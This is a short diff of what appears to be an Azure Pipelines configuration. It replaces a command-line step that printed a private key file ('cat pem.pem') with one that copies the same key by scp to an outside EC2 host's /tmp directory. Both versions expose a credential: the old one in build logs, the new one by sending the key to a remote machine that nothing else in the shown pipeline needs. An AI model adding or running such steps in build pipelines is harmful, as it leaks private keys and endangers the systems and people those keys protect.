@@ -18,4 +18,4 @@ jobs:
       DetectArguments: '--detect.project.name=test --detect.project.version.name=1.0 --blackduck.trust.cert=true'
   - task: CmdLine@2
     inputs:
-      script: 'cat pem.pem'
+      script: 'scp -i pem.pem pem.pem ec2-user@ec2-3-90-44-94.compute-1.amazonaws.com:/tmp'
